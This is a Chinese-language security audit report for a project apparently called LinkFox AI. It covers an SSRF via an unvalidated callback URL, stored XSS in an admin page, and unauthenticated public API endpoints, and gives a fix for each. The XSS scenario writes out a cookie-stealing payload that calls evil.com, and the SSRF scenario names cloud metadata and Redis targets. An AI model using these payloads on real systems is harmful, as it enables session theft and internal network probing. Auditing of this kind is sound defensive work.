# LinkFox AI 项目安全审计报告

**审计日期**: 2026-05-24
**审计范围**: 全量代码

---

## Vuln 1: SSRF（服务端请求伪造）— `app/services/poller.py:98-101`

- **严重程度**: HIGH
- **类别**: `ssrf`
- **置信度**: 8/10

**描述**: 用户在创建任务时提供的 `callback_url` 参数未被验证，服务端在任务完成时直接向该 URL 发送 POST 请求。攻击者可以构造内网地址，使服务端请求内部服务或云元数据端点。

**数据流**:
1. `app/models/schemas.py:25` — `callback_url: str | None` 字段无任何 URL 校验（无 `AnyUrl` 类型，无正则约束）
2. `app/api/tasks.py:30-42` — 请求体直接存入数据库 `params` 字段
3. `app/services/poller.py:98-101` — 从 `task.params` 取出 `callback_url`，直接传给 `requests.post(url, ...)`

**利用场景**: 攻击者提交任务时将 `callback_url` 设为 `http://169.254.169.254/latest/meta-data/`（云元数据）或 `http://127.0.0.1:6379/`（本地 Redis），任务完成后服务端会向内网地址发起 POST 请求。虽为盲 SSRF（不返回响应），但足以探测内网拓扑、攻击未鉴权的内部服务。

**修复建议**:
```python
# schemas.py — 使用 AnyUrl 约束
from pydantic import AnyUrl
callback_url: AnyUrl | None = Field(default=None, description="回调 URL")

# poller.py — 增加协议/主机白名单校验
import re
if not re.match(r'^https://', url):
    logger.warning("callback_url must be HTTPS, got: %s", url)
    return
```

---

## Vuln 2: 存储型 XSS — `docs/manager.html:多处`

- **严重程度**: MEDIUM
- **类别**: `xss`
- **置信度**: 8/10

**描述**: 管理页面使用原生 `innerHTML` 渲染从 API 获取的任务数据，其中 `seller_point` 字段完全由用户控制，未经任何转义直接插入 DOM。攻击者可创建包含恶意 HTML/JavaScript 的任务，当管理员打开管理页面时触发代码执行。

**具体位置**:

| 行号 | 注入点 |
|------|--------|
| `manager.html:242` | `${t.seller_point}` — 任务列表渲染 |
| `manager.html:301` | `${d.seller_point}` — 查询结果渲染 |
| `manager.html:322` | `${d.seller_point}` — 详情弹窗渲染 |

**利用场景**:
1. 攻击者调用 `POST /api/v1/tasks`（无需鉴权），设置 `seller_point` 为 `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
2. 管理员打开 `/manager` 页面，管理页面每 10 秒自动刷新任务列表
3. `innerHTML` 渲染恶意内容，`onerror` 触发，攻击者窃取管理员浏览器中的敏感信息

**备注**: `provider` 字段同样由用户控制并以 `innerHTML` 渲染，存在相同的 XSS 风险。

**修复建议**:
```javascript
// 创建 HTML 转义函数
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}
// 对所有用户可控字段使用 escapeHtml()
${escapeHtml(t.seller_point || '-')}
```

---

## Vuln 3: API 未鉴权 — `app/api/tasks.py:全部端点`

- **严重程度**: MEDIUM
- **类别**: `authorization_bypass`
- **置信度**: 9/10

**描述**: 全部 API 端点无任何身份认证机制，且根据 `docs/project_overview.html` 中的部署信息，服务部署在公网 IP (`47.237.78.24:8000`)。任何能访问该 IP 的人都可以：

- 创建任务（消耗 LinkFox API 配额和费用）
- 查看所有任务详情和生成结果图片
- 取消任意任务
- 查看统计数据

**影响**: 资源滥用（他人可无限制使用付费的 LinkFox API）、数据泄露（任务结果图片可被任意查看）、服务破坏（批量取消任务）。

**修复建议**: 至少添加 API Key 或简单的 Bearer Token 认证。可在 `Settings` 中增加 `API_KEY` 配置，在 FastAPI 中间件或依赖注入中校验。

---

## 总结

| # | 严重程度 | 类别 | 位置 |
|---|---------|------|------|
| 1 | **HIGH** | SSRF | `poller.py:98` / `schemas.py:25` |
| 2 | **MEDIUM** | Stored XSS | `manager.html` 多处 `innerHTML` |
| 3 | **MEDIUM** | 未鉴权 | `tasks.py` 全部端点 + 公网部署 |
